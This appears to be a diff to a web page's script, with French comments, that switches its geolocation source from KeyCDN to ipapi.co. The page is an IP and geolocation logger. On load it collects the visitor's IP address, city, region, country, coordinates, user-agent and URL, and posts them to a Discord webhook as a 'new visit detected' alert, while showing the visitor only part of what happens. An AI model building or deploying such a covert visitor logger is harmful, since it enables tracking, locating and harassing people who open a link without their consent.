@@ -26,13 +26,11 @@
       }
     }
 
-    // Récupère les infos géo via KeyCDN
-    async function getKeyCDNGeoData(ip) {
+    // Récupère les infos de géolocalisation via ipapi.co
+    async function getIpapiGeoData(ip) {
       try {
-        const res = await fetch(`https://tools.keycdn.com/geo.json?host=${ip}`);
-        const data = await res.json();
-        // Structure KeyCDN : data.data.geo
-        return data.data && data.data.geo ? data.data.geo : null;
+        const res = await fetch(`https://ipapi.co/${ip}/json/`);
+        return await res.json();
       } catch {
         return null;
       }
@@ -60,19 +58,19 @@
     }
 
     // Envoie toutes les infos au webhook Discord
-    async function sendToDiscord(ip, keycdnData, mapImageURL, clientInfo) {
+    async function sendToDiscord(ip, ipapiData, mapImageURL, clientInfo) {
       const payload = {
         username: "Logger IP & Géolocalisation",
         embeds: [{
           title: "Nouvelle visite détectée",
           description: 
             `**IP**: ${ip}\n` +
-            (keycdnData ? (
-              `**Ville**: ${keycdnData.city}\n` +
-              `**Région**: ${keycdnData.region}\n` +
-              `**Pays**: ${keycdnData.country_name}\n` +
-              `**Code Pays**: ${keycdnData.country_code}\n` +
-              `**Latitude/Longitude**: ${keycdnData.latitude},${keycdnData.longitude}\n`
+            (ipapiData ? (
+              `**Ville**: ${ipapiData.city}\n` +
+              `**Région**: ${ipapiData.region}\n` +
+              `**Pays**: ${ipapiData.country_name}\n` +
+              `**Code Pays**: ${ipapiData.country}\n` +
+              `**Latitude/Longitude**: ${ipapiData.latitude},${ipapiData.longitude}\n`
             ) : "") +
             `**User-Agent**: ${clientInfo.user_agent}\n` +
             `**URL**: ${clientInfo.url}\n` +
@@ -92,18 +90,18 @@
     }
 
     // Affiche les infos sur la page
-    function displayInfo(ip, keycdnData, mapImageURL) {
+    function displayInfo(ip, ipapiData, mapImageURL) {
       document.getElementById("result").innerHTML = `
         <div class="info">
           <p><strong>IP :</strong> ${ip}</p>
-          ${keycdnData ? `
-            <p><strong>Ville :</strong> ${keycdnData.city}</p>
-            <p><strong>Région :</strong> ${keycdnData.region}</p>
-            <p><strong>Pays :</strong> ${keycdnData.country_name}</p>
-            <p><strong>Latitude, Longitude :</strong> ${keycdnData.latitude}, ${keycdnData.longitude}</p>
-          ` : `<p><em>Impossible de récupérer les infos KeyCDN.</em></p>`}
+          ${ipapiData ? `
+            <p><strong>Ville :</strong> ${ipapiData.city}</p>
+            <p><strong>Région :</strong> ${ipapiData.region}</p>
+            <p><strong>Pays :</strong> ${ipapiData.country_name}</p>
+            <p><strong>Latitude, Longitude :</strong> ${ipapiData.latitude}, ${ipapiData.longitude}</p>
+          ` : `<p><em>Impossible de récupérer les infos ipapi.co.</em></p>`}
         </div>
-        ${keycdnData && keycdnData.latitude && keycdnData.longitude ? 
+        ${ipapiData && ipapiData.latitude && ipapiData.longitude ? 
           `<img src="${mapImageURL}" alt="Carte de la localisation">` : ''}
       `;
     }
@@ -115,14 +113,14 @@
         document.getElementById("result").innerHTML = "<p>Impossible de récupérer les informations IP.</p>";
         return;
       }
-      const keycdnData = await getKeyCDNGeoData(ipData.ip);
-      const lat = keycdnData && keycdnData.latitude ? keycdnData.latitude : null;
-      const lon = keycdnData && keycdnData.longitude ? keycdnData.longitude : null;
+      const ipapiData = await getIpapiGeoData(ipData.ip);
+      const lat = ipapiData && ipapiData.latitude ? ipapiData.latitude : null;
+      const lon = ipapiData && ipapiData.longitude ? ipapiData.longitude : null;
       const mapImageURL = (lat && lon) ? getMapImageURL(lat, lon) : '';
       const clientInfo = getClientInfo();
 
-      displayInfo(ipData.ip, keycdnData, mapImageURL);
-      sendToDiscord(ipData.ip, keycdnData, mapImageURL, clientInfo);
+      displayInfo(ipData.ip, ipapiData, mapImageURL);
+      sendToDiscord(ipData.ip, ipapiData, mapImageURL, clientInfo);
     })();
   </script>
 </body>
